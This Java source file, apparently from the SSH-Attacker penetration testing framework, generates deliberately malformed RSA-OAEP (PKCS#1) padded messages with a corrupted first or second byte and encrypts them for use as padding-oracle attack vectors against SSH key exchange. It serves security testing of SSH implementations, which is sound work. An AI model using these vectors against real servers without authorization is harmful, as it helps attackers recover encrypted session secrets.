/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
import de.rub.nds.sshattacker.core.constants.Bits;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/** */
public class Pkcs1VectorGenerator {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * Generates an encrypted Pkcs1 Vector with correct first byte, but another error so decoding
     * will fail
     *
     * @param publicKey Public key for encyrption
     * @param hashLength Bit length of the hash function
     * @param hashInstance Hash function to be used
     * @return Pkcs1 Vector with correct first byte but incorrect second byte
     */
    public static Pkcs1Vector generateCorrectFirstBytePkcs1Vector(
            RSAPublicKey publicKey, int hashLength, String hashInstance) {
        Pkcs1Vector encryptedVector =
                generatePlainCorrectFirstBytePkcs1Vector(
                        publicKey.getModulus().bitLength(), hashLength, hashInstance);
        try {
            Cipher rsa = Cipher.getInstance("RSA/NONE/NoPadding");
            LOGGER.debug("Provider: " + rsa.getProvider());
            rsa.init(Cipher.ENCRYPT_MODE, publicKey);
            // encrypt padded key
            byte[] encrypted = rsa.doFinal(encryptedVector.getPlainValue());
            encryptedVector.setEncryptedValue(encrypted);
            return encryptedVector;
        } catch (BadPaddingException
                | IllegalBlockSizeException
                | InvalidKeyException
                | NoSuchAlgorithmException
                | NoSuchPaddingException ex) {
            throw new ConfigurationException(
                    "The PKCS#1 attack vectors could not be generated.", ex);
        }
    }

    /**
     * Generates a plain Pkcs1 Vector with correct first byte, but another error so decoding will
     * fail
     *
     * @param publicKeyBitLength Bit length of the transient public key
     * @param hashLength Bit length of the hash function
     * @return A PKCS1 v2.x vector with starting 00 byte but incorrect second byte
     */
    public static Pkcs1Vector generatePlainCorrectFirstBytePkcs1Vector(
            int publicKeyBitLength, int hashLength, String hashInstance) {
        int sharedSecretByteLength = (publicKeyBitLength - 2 * hashLength - 49) / Bits.IN_A_BYTE;
        byte[] keyBytes = new byte[sharedSecretByteLength];
        Arrays.fill(keyBytes, (byte) 42);
        int publicKeyByteLength = publicKeyBitLength / Bits.IN_A_BYTE;

        return new Pkcs1Vector(
                "Wrong second byte but correct first byte (XORed with 0xFF)",
                getSecretWrongSecondByte(publicKeyByteLength, keyBytes, hashInstance));
    }

    /**
     * Generates different encrypted PKCS1 vectors
     *
     * @param publicKey The RSA public key
     * @return encrypted pkcs1Vectors
     */
    public static List<Pkcs1Vector> generatePkcs1Vectors(
            RSAPublicKey publicKey, int hashLength, String hashInstance) {
        List<Pkcs1Vector> encryptedVectors =
                generatePlainPkcs1Vectors(
                        publicKey.getModulus().bitLength(), hashLength, hashInstance);
        try {
            Cipher rsa = Cipher.getInstance("RSA/NONE/NoPadding");
            LOGGER.debug("Provider: " + rsa.getProvider());
            rsa.init(Cipher.ENCRYPT_MODE, publicKey);
            // encrypt all the padded keys
            for (Pkcs1Vector vector : encryptedVectors) {
                byte[] encrypted = rsa.doFinal(vector.getPlainValue());
                vector.setEncryptedValue(encrypted);
            }
            return encryptedVectors;
        } catch (BadPaddingException
                | IllegalBlockSizeException
                | InvalidKeyException
                | NoSuchAlgorithmException
                | NoSuchPaddingException ex) {
            throw new ConfigurationException(
                    "The different PKCS#1 attack vectors could not be generated.", ex);
        }
    }

    /**
     * Generates different plain PKCS1 vectors
     *
     * @param publicKeyBitLength The length of the public key in bits
     * @param hashLength The length of the hash function's output in bits
     * @return pkcs1Vectors
     */
    public static List<Pkcs1Vector> generatePlainPkcs1Vectors(
            int publicKeyBitLength, int hashLength, String hashInstance) {
        int sharedSecretByteLength = (publicKeyBitLength - 2 * hashLength - 49) / Bits.IN_A_BYTE;
        byte[] keyBytes = new byte[sharedSecretByteLength];
        Arrays.fill(keyBytes, (byte) 42);
        int publicKeyByteLength = publicKeyBitLength / Bits.IN_A_BYTE;

        // create plain padded keys
        List<Pkcs1Vector> pkcs1Vectors = new LinkedList<>();
        pkcs1Vectors.add(
                generatePlainCorrectFirstBytePkcs1Vector(
                        publicKeyBitLength, hashLength, hashInstance));
        pkcs1Vectors.add(
                new Pkcs1Vector(
                        "Wrong first byte (set to 01 instead of 00)",
                        getSecretWrongFirstByte(publicKeyByteLength, keyBytes, hashInstance)));
        return pkcs1Vectors;
    }

    /**
     * Generates a validly padded message
     *
     * @param rsaKeyLength RSA key length in bytes
     * @param sharedSecret Shared secret to be padded
     * @return padded secret
     */
    private static byte[] getPaddedSecret(
            int rsaKeyLength, byte[] sharedSecret, String hashInstance) {
        try {
            return OaepConverter.doOaepEncoding(sharedSecret, hashInstance, rsaKeyLength);
        } catch (NoSuchAlgorithmException e) {
            LOGGER.debug("Encoding error", e);
            return new byte[rsaKeyLength];
        }
    }

    private static byte[] getSecretWrongFirstByte(
            int rsaKeyLength, byte[] sharedSecret, String hashInstance) {
        byte[] paddedSecret = getPaddedSecret(rsaKeyLength, sharedSecret, hashInstance);
        paddedSecret[0] = (byte) 1;
        LOGGER.debug(
                "Generated a PKCS1 padded message with a wrong first byte: {}",
                ArrayConverter.bytesToHexString(paddedSecret));
        return paddedSecret;
    }

    private static byte[] getSecretWrongSecondByte(
            int rsaKeyLength, byte[] sharedSecret, String hashInstance) {
        byte[] paddedSecret = getPaddedSecret(rsaKeyLength, sharedSecret, hashInstance);
        paddedSecret[1] = (byte) (paddedSecret[1] ^ (byte) 255);
        LOGGER.debug(
                "Generated a PKCS1 padded message with a wrong second byte: {}",
                ArrayConverter.bytesToHexString(paddedSecret));
        return paddedSecret;
    }

    /** No instantiation needed, only one static method used */
    private Pkcs1VectorGenerator() {}
}
